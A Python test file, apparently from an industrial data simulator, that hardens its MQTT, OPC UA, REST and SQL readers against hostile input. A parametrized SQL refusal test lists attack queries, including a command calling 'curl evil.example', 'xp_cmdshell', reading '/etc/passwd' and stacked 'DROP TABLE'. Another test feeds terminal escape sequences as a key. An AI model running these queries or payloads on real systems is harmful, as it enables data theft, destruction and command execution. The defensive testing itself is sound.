    held = sum(len(known) for known in state["aliases"].values())
    assert held == 50 and len(state["aliases"]) <= 50 and len(state["seq"]) <= 50
    assert sink.counts.count("keys") == 30 * 10 - 50
    # A node that is born again replaces its own aliases: that is not growth.
    mqtt.deliver("spBv1.0/G/NBIRTH/N0", _pb(1, 1) + _metric("m0", 7, 10, double=1.0) + _pb(3, 0),
                 options, sink, state)
    assert state["aliases"]["G/N0"] == {7: ("m0", 10)}
    for node in range(60):                              # deaths and data of unknown nodes
        mqtt.deliver(f"spBv1.0/G/NDATA/X{node}", _pb(1, 1) + _pb(3, 5), options, sink, state)
    assert len(state["seq"]) <= 50


def test_a_dripped_packet_cannot_hold_the_link_or_the_thread(broker, monkeypatch):
    """I5: a PUBLISH whose bytes arrive one at a time used to defeat the packet timeout, the
    dead-link check and `close`: the deadline and the stop are now checked after every read."""
    import time

    from nagasim import live
    from nagasim.readers import mqtt

    monkeypatch.setattr(mqtt, "PACKET_TIMEOUT", 0.6)
    monkeypatch.setattr(live.random, "random", lambda: 0.0)
    plant = broker()
    dripping = threading.Event()

    def drip():
        try:
            plant.raw(_mq_frame(0x30, _mq_text("plant/a") + b"1" * 150_000)[:12])
            while not dripping.is_set():
                plant.client.sendall(b"1")
                time.sleep(0.05)
        except OSError:
            pass

    with live.Feed([_topics()], network=_policy(_mqtt(plant.port))) as feed:
        feed.changes("line")
        assert plant.ready.wait(5)
        threading.Thread(target=drip, daemon=True).start()
        _eventually(lambda: "half way" in (feed.status("line")["problem"] or ""), seconds=4)
        dripping.set()
        # ... and a close in the middle of a drip ends the reader's thread.
        assert plant.ready.wait(5)
        dripping.clear()
        threading.Thread(target=drip, daemon=True).start()
        time.sleep(0.2)
        thread = feed._sources["line"].thread
    thread.join(2.0)
    dripping.set()
    assert not thread.is_alive()


def test_naga_watch_prints_a_key_as_data_not_as_terminal_commands(rest_plant, tmp_path, capsys):
    """M1: a key comes from the plant; one that holds an escape sequence must not drive the
    terminal of whoever watches."""
    from nagasim import live

    port, _seen = rest_plant({"/api/v2/orders": [{"id": "WO\x1b[2J\x1b]0;owned\x07", "quantity": 1}]})
    model, connections = _watch_files(tmp_path, port)
    assert live.main([model, "--connections", connections, "--for", "0.2"]) == 0
    out = capsys.readouterr().out
    assert "\x1b" not in out and "\x07" not in out and r"WO\x1b[2J" in out


def test_the_node_the_library_understood_is_the_node_that_was_approved(monkeypatch):
    """The root check judges OUR reading of a node id. Whatever a version of the library
    makes of the same text, its parsed id must be that node: a mismatch closes the session
    before anything is read or subscribed."""
    asyncua = pytest.importorskip("asyncua", reason="the optional extra nagasim[opcua] is not installed")
    import asyncio

    from nagasim.readers import opcua

    parse = asyncua.ua.NodeId.from_string
    guid = "ns=2;g=09087e75-8e5e-499b-954f-f2a9603db28a"
    for text in ("ns=2;i=5", "i=2258", "ns=2;s=Press.Speed", "ns=2;s=a;b", guid, guid.upper().replace("NS=2;G=", "ns=2;g="),
                 "ns=2;b=YWJj", "ns=300;i=70000"):
        assert opcua._same(opcua._parts(text), parse(text)), text
    for text, other in (("ns=2;i=5", "ns=0;i=2258"), ("ns=2;i=5", "ns=2;i=6"), ("ns=2;i=5", "ns=2;s=5"),
                        ("ns=2;s=Press.Speed", "ns=2;s=Press.Speed2"), (guid, guid[:-1] + "b"),
                        ("ns=2;b=YWJj", "ns=3;b=YWJj")):
        assert not opcua._same(opcua._parts(text), parse(other)), (text, other)

    calls = []

    class Client:
        def __init__(self, url, timeout):
            self.uaclient = types.SimpleNamespace(protocol=None)

        async def connect(self):
            pass

        def get_node(self, text):               # a parser that reads another node in the text
            return types.SimpleNamespace(nodeid=parse("ns=0;i=2258"))

        async def create_subscription(self, *args):
            calls.append("subscription")

        async def disconnect(self):
            calls.append("closed")

    monkeypatch.setattr(asyncua, "Client", Client)
    with pytest.raises(sources.ReadError) as caught:
        asyncio.run(opcua._session("opc.tcp://127.0.0.1:4840", _opcua(4840),
                                   {"nodes": ["ns=2;i=5"], "interval_ms": 1000},
                                   types.SimpleNamespace(warn=lambda *said: None), None))
    assert calls == ["closed"] and caught.value.code == "E_DATA_SOURCE_LOCATION"
    assert "ns=2;i=5" in caught.value.message


# ---------------------------------------------------------------- OPC UA, encrypted (D223)
def _ua_certificate(folder, name, uri, days=(-1, 30)):
    """(certificate path, key path): a self-signed application certificate for *uri*, valid
    from days[0] to days[1] from now, made here with `cryptography`."""
    import datetime

    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, name)])
    now = datetime.datetime.now(datetime.timezone.utc)
    certificate = (
        x509.CertificateBuilder().subject_name(subject).issuer_name(subject)
        .public_key(key.public_key()).serial_number(x509.random_serial_number())
        .not_valid_before(now + datetime.timedelta(days=days[0]))
        .not_valid_after(now + datetime.timedelta(days=days[1]))
        .add_extension(x509.SubjectAlternativeName(
            [x509.UniformResourceIdentifier(uri), x509.DNSName("press.plant.test")]), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.KeyUsage(digital_signature=True, content_commitment=True,
                                     key_encipherment=True, data_encipherment=True,
                                     key_agreement=False, key_cert_sign=True, crl_sign=False,
                                     encipher_only=False, decipher_only=False), critical=True)
        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH,
                                              ExtendedKeyUsageOID.CLIENT_AUTH]), critical=False)
        .sign(key, hashes.SHA256()))
    (folder / f"{name}.der").write_bytes(certificate.public_bytes(serialization.Encoding.DER))
    (folder / f"{name}.pem").write_bytes(key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption()))
    return str(folder / f"{name}.der"), str(folder / f"{name}.pem")


class _Tap:
    """A loopback relay between the reader and the server that keeps every byte each side
    sent: what a wire-tapper on the plant's network would see."""

    def __init__(self, target_port):
        self.sent, self.target = [], target_port
        self.server = socket.socket()
        self.server.bind(("127.0.0.1", 0))
        self.server.listen()
        self.port = self.server.getsockname()[1]
        threading.Thread(target=self._accept, daemon=True).start()

    def _accept(self):
        while True:
            try:
                client, _peer = self.server.accept()
            except OSError:
                return
            upstream = socket.create_connection(("127.0.0.1", self.target))
            for source, sink, record in ((client, upstream, True), (upstream, client, False)):
                threading.Thread(target=self._pump, args=(source, sink, record), daemon=True).start()

    def _pump(self, source, sink, record):
        try:
            while True:
                data = source.recv(65_536)
                if not data:
                    break
                if record:
                    self.sent.append(data)
                sink.sendall(data)
        except OSError:
            pass
        finally:
            for one in (source, sink):
                try:
                    one.close()
                except OSError:
                    pass

    def close(self):
        self.server.close()


@pytest.fixture(scope="session")
def ua_certificates(tmp_path_factory):
    """Four certificates, made once: RSA keys take a moment each."""
    pytest.importorskip("cryptography")
    folder = tmp_path_factory.mktemp("opcua")
    return {"server": _ua_certificate(folder, "server", "urn:naga:test:server"),
            "client": _ua_certificate(folder, "client", "urn:naga:test:client"),
            "other": _ua_certificate(folder, "other", "urn:naga:test:server"),
            "expired": _ua_certificate(folder, "expired", "urn:naga:test:server", days=(-30, -1))}


@pytest.fixture
def secure_press(ua_certificates, plant_net):
    """An in-process `asyncua.Server` on loopback that offers ONLY Basic256Sha256 with
    SignAndEncrypt and one user, `twin` / `p4ss-Canary`. Yields a namespace: the port, the
    node id text, the certificates' paths, and `write(value)`."""
    asyncua = pytest.importorskip("asyncua", reason="the optional extra nagasim[opcua] is not installed")
    pytest.importorskip("cryptography")
    import asyncio

    from asyncua.server.user_managers import UserManager
    from asyncua.crypto.permission_rules import User, UserRole

    press = types.SimpleNamespace(**ua_certificates, logins=[], writes=[], certificate="server",
                                  uri="urn:naga:test:server")
    started, done = threading.Event(), threading.Event()

    class Users(UserManager):
        def get_user(self, iserver, username=None, password=None, certificate=None):
            press.logins.append((username, password))
            return User(role=UserRole.User) if (username, password) == ("twin", "p4ss-Canary") else None

    async def serve():
        probe = socket.socket()
        probe.bind(("127.0.0.1", 0))
        press.port = probe.getsockname()[1]
        probe.close()
        server = asyncua.Server(user_manager=Users())
        await server.init()
        server.set_endpoint(f"opc.tcp://127.0.0.1:{press.port}/plant")
        await server.set_application_uri(press.uri)
        server.set_security_policy([asyncua.ua.SecurityPolicyType.Basic256Sha256_SignAndEncrypt])
        certificate, key = getattr(press, press.certificate)
        await server.load_certificate(certificate)
        await server.load_private_key(key)
        index = await server.register_namespace("urn:naga:test")
        speed = await server.nodes.objects.add_variable(asyncua.ua.NodeId("Press.Speed", index),
                                                        "Speed", 12.5)
        press.node = f"ns={index};s=Press.Speed"
        async with server:
            started.set()
            while not done.is_set():
                while press.writes:
                    await speed.write_value(press.writes.pop(0))
                await asyncio.sleep(0.05)

    def start(certificate="server", uri="urn:naga:test:server"):
        press.certificate, press.uri = certificate, uri
        press.thread = threading.Thread(target=lambda: asyncio.run(serve()), daemon=True)
        press.thread.start()
        assert started.wait(15)
        return press

    press.start = start
    yield press
    done.set()
    if getattr(press, "thread", None):
        press.thread.join(10)


def _secure(press, port, **fields) -> netguard.Connection:
    base = {"security": "Basic256Sha256", "server_cert": press.server[0],
            "client_cert": press.client[0], "client_key": press.client[1],
            "username": "twin", "secret": netguard.Secret("p4ss-Canary")}
    return _opcua(port, **{**base, **fields})


def test_opcua_sign_and_encrypt_with_a_password_inside_the_channel(secure_press, monkeypatch):
    """The encrypted mode, against a real server in this process, through a relay that keeps
    every byte the reader sent. A session opens and data changes arrive; the password is in
    nothing that crossed the wire; the key is read from the caller's path and no temporary
    file is made; the message cap is the one in force."""
    import tempfile

    from asyncua.crypto import uacrypto

    from nagasim import live
    from nagasim.readers import opcua

    press = secure_press.start()
    tap = _Tap(press.port)
    keys, clients, temporary = [], [], []
    load_key = uacrypto.load_private_key
    monkeypatch.setattr(uacrypto, "load_private_key",
                        lambda path, *args, **kwargs: keys.append(path) or load_key(path, *args, **kwargs))
    real_agreed = opcua._agreed
    monkeypatch.setattr(opcua, "_agreed", lambda client: clients.append(client) or real_agreed(client))
    for name in ("mkstemp", "mkdtemp", "NamedTemporaryFile", "TemporaryFile", "TemporaryDirectory"):
        monkeypatch.setattr(tempfile, name, lambda *args, _name=name, **kwargs: temporary.append(_name))
    try:
        with live.Feed([_nodes(press.node, interval_ms=100)],
                       network=_policy(_secure(press, tap.port))) as feed:
            events, cursor = _until(feed, "press", 1, seconds=10.0)
            assert [(e.key, e.value) for e in events] == [(press.node, 12.5)]
            press.writes.append(20.0)
            events, cursor = _until(feed, "press", 1, cursor)
            assert events[0].value == 20.0 and feed.status("press")["channel"] == "tls"
            size, chunks = real_agreed(clients[-1])
            assert 0 < size <= 262_144 and 0 < chunks <= 5
    finally:
        tap.close()
    assert press.logins == [("twin", "p4ss-Canary")]            # it arrived, decrypted, once
    wire = b"".join(tap.sent)
    assert wire[:3] == b"HEL" and b"OPN" in wire[:400] and len(wire) > 2_000
    for spelling in (b"p4ss-Canary", "p4ss-Canary".encode("utf-16-le"), b"cDRzcy1DYW5hcnk"):
        assert spelling not in wire
    assert b"twin" not in wire and press.node.encode() not in wire      # nothing readable at all
    assert keys == [press.client[1]] and temporary == []


# (what is wrong, the server's certificate, the server's application URI, what the caller
# pins): each one refused before the password is sent.
_SECURE_REFUSALS = [
    ("a certificate the caller did not pin", "other", "urn:naga:test:server", "server"),
    ("an expired certificate, even pinned", "expired", "urn:naga:test:server", "expired"),
    ("an application URI that is not the certificate's", "server", "urn:naga:test:another", "server"),
]


@pytest.mark.parametrize("what, certificate, uri, pinned", _SECURE_REFUSALS,
                         ids=[case[0] for case in _SECURE_REFUSALS])
@pytest.mark.slow
def test_an_opcua_server_whose_certificate_is_not_right_never_gets_the_password(
        what, certificate, uri, pinned, secure_press):
    from nagasim import live

    press = secure_press.start(certificate, uri)
    tap = _Tap(press.port)
    conn = _secure(press, tap.port, server_cert=getattr(press, pinned)[0])
    try:
        with live.Feed([_nodes(press.node, interval_ms=100)], network=_policy(conn)) as feed:
            feed.changes("press")
            _eventually(lambda: feed.status("press")["problem"], seconds=15)
            status = feed.status("press")
            assert status["state"] == "down" and status["seq"] == 0
            assert "Canary" not in json.dumps(status)
    finally:
        tap.close()
    assert press.logins == []                                   # the password was never sent
    assert b"p4ss-Canary" not in b"".join(tap.sent)


def test_an_opcua_certificate_that_cannot_be_used_is_said_before_connecting(secure_press):
    """Our own checks, on the caller's files, before anything is dialled: the pinned server
    certificate and the client certificate must be inside their validity."""
    import asyncio

    from nagasim.readers import opcua

    press = secure_press
    for fields, said in (({"server_cert": press.expired[0]}, "server certificate"),
                         ({"client_cert": press.expired[0], "client_key": press.expired[1]},
                          "client certificate")):
        with pytest.raises(sources.ReadError) as caught:
            asyncio.run(opcua._session("opc.tcp://127.0.0.1:1/plant", _secure(press, 1, **fields),
                                       {"nodes": ["i=1"], "interval_ms": 1000}, None, None))
        assert caught.value.code == "E_DATA_TLS" and said in caught.value.message
        assert "Canary" not in caught.value.message + caught.value.hint


# ---------------------------------------------------------------- REST: work bounded before it is done
def _parsed(body: bytes, limits=(), **options):
    """(rows or the refusal's code, objects built, peak bytes allocated) of parsing *body*."""
    import tracemalloc

    from nagasim.readers import rest

    built = []
    loads = rest.json.loads
    conn = _rest(80, limits=limits)
    with mock.patch.object(rest.json, "loads", lambda text, **kw: built.append(1) or loads(text, **kw)):
        tracemalloc.start()
        try:
            out = rest._rows(body, {"name": "orders"}, conn, options)
        except sources.ReadError as exc:
            out = (exc.code, exc.message)
        peak = tracemalloc.get_traced_memory()[1]
        tracemalloc.stop()
    return out, len(built), peak


@pytest.mark.slow
def test_a_rest_body_of_millions_of_rows_is_refused_at_the_row_cap_not_after_parsing():
    """A 20 MB body of `{},` is millions of dicts if it is parsed whole first. The rows are
    decoded one at a time and the read is refused at the cap: the work done is the cap's,
    whatever the body's size (counted, and measured, never timed)."""
    body = b"[" + b"{}," * 400_000 + b"{}]"                 # 1.2 MB, 400 001 rows
    out, built, peak = _parsed(body, limits=(("rows", 100),))
    assert out[0] == "E_DATA_TOO_LARGE" and "row cap" in out[1]
    assert built == 100 and peak < 4 * len(body)            # whole, it is about 30 times the body
    wrapped = b'{"junk": [' + b"{}," * 400_000 + b'{}], "items": [{"id": 1, "t": "a]}\\\"["}], "more": {"x": [1]}}'
    out, built, peak = _parsed(wrapped, records="items")
    assert out == [{"id": 1, "t": 'a]}"['}] and built == 1 and peak < 4 * len(wrapped)
    # One row that is itself enormous is judged by its size before it is decoded.
    huge = b'[{"a": [' + b"{}," * 200_000 + b"{}]}]"
    out, built, peak = _parsed(huge)
    assert out[0] == "E_DATA_TOO_LARGE" and "one row" in out[1] and built == 0


@pytest.mark.parametrize("body, records, expected", [
    (b' [ {"id": 1, "s": "x,y]"} , {"id": 2, "n": [1, {"k": "}"}], "m": {"a": 1}} ] \n', None,
     [{"id": 1, "s": "x,y]"}, {"id": 2}]),
    (b"[]", None, []),
    (b'{"a": "items", "items": [{"id": 1}], "items2": 5}', "items", [{"id": 1}]),
    (b'{"a": {"items": [{"id": 9}]}, "items": []}', "items", []),
    (b'[{"id": 1} {"id": 2}]', None, "did not answer with JSON"),
    (b'[{"id": 1}, ]', None, "did not answer with JSON"),
    (b'[{"id": 1}] trailing', None, "did not answer with JSON"),
    (b'[{"id": 1}', None, "did not answer with JSON"),
    (b'[{"id": 1,}]', None, "did not answer with JSON"),
    (b'[{"id": 1}, 2]', None, "not a JSON array of objects"),
    (b'{"id": 1}', None, "not a JSON array of objects"),
    (b'{"items": {"id": 1}}', "items", "not a JSON array of objects"),
    (b'{"other": [{"id": 1}]}', "items", "not a JSON array of objects"),
    (b'[{"id": 1}]', "items", "not a JSON array of objects"),
    (b'"text"', None, "not a JSON array of objects"),
    (b'{"items": [{"id": 1}', "items", "did not answer with JSON"),
])
def test_the_incremental_rest_parser_reads_what_the_whole_one_read(body, records, expected):
    out, _built, _peak = _parsed(body, **({"records": records} if records else {}))
    if isinstance(expected, str):
        assert out[0] == "E_DATA_READ" and expected in out[1]
    else:
        assert out == expected


# ---------------------------------------------------------------- a query is one SELECT
@pytest.mark.parametrize("query", [
    "ATTACH DATABASE 'other.sqlite' AS other", "PRAGMA table_info(orders)",
    "SELECT 1; DROP TABLE orders", "SELECT 1;\nSELECT 2", "DELETE FROM orders",
    "INSERT INTO orders VALUES ('x', 1, 1.0, 'y')", "VACUUM INTO 'copy.sqlite'",
    "-- a comment first\nATTACH DATABASE 'x' AS y", "/* c */ PRAGMA x", "", "   ",
    "COPY orders TO PROGRAM 'curl evil.example'", "EXEC xp_cmdshell 'dir'", "CALL sys.x()",
    "SET search_path = x", "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t"])
def test_a_query_that_is_not_one_select_is_refused_before_any_driver(query, tmp_path, monkeypatch):
    """Both SQL kinds, at the text of the query, so it holds whatever the driver would do
    with it: for `sql` the refusal comes before the driver is even imported."""
    _files(tmp_path)
    monkeypatch.setattr(socket, "getaddrinfo", _public)
    monkeypatch.setitem(sys.modules, "sqlalchemy", None)
    for source in ({"kind": "sqlite", "location": "orders.sqlite"},
                   {"kind": "sql", "location": "postgresql://user@db.example/plant"}):
        with pytest.raises(databind._BindingError) as caught:
            databind._read_source({"name": "s", "query": query, **source}, tmp_path, _ON, None)
        assert caught.value.code == "E_DATA_QUERY", (source["kind"], caught.value.message)


def test_a_select_is_read_as_before(tmp_path):
    _files(tmp_path)
    for query, expected in (("SELECT count(*) AS n FROM orders", 3),
                            ("  select count(*) AS n from orders ;  ", 3),
                            ("WITH big AS (SELECT * FROM orders WHERE quantity > 2) SELECT count(*) AS n FROM big", 2),
                            ("SELECT count(*) AS n FROM orders WHERE site = 'a;b'", 0)):
        frame, _stamp = databind._read_source(
            {"name": "s", "kind": "sqlite", "location": "orders.sqlite", "query": query},
            tmp_path, _OFF, None)
        assert int(frame["n"].iloc[0]) == expected, query


def test_one_sparkplug_owner_cannot_take_the_whole_alias_budget():
    """An owner (a node or a device) keeps at most one sixteenth of the connection's `keys`
    limit, and all owners together at most the limit: one birth of 10 000 aliases used to
    take everything, and every device born after it resolved nothing."""
    from nagasim.readers import mqtt

    sink, state = _Sink(), {"aliases": {}, "seq": {}, "limit": 1600}
    options = {"payload": "sparkplug_b"}
    greedy = b"".join(_metric(f"m{n}", n, 10, double=1.0) for n in range(2000))
    mqtt.deliver("spBv1.0/G/NBIRTH/Greedy", _pb(1, 1) + greedy + _pb(3, 0), options, sink, state)
    assert len(state["aliases"]["G/Greedy"]) == 100 and sink.counts.count("keys") == 1900
    for device in range(15):
        modest = b"".join(_metric(f"m{n}", n, 10, double=1.0) for n in range(100))
        mqtt.deliver(f"spBv1.0/G/DBIRTH/Greedy/D{device}", _pb(1, 1) + modest + _pb(3, device + 1),
                     options, sink, state)
    assert all(len(held) == 100 for held in state["aliases"].values()) and len(state["aliases"]) == 16
    assert sink.counts.count("keys") == 1900                    # nobody else lost anything
    assert mqtt.OWNER_SHARE == 16
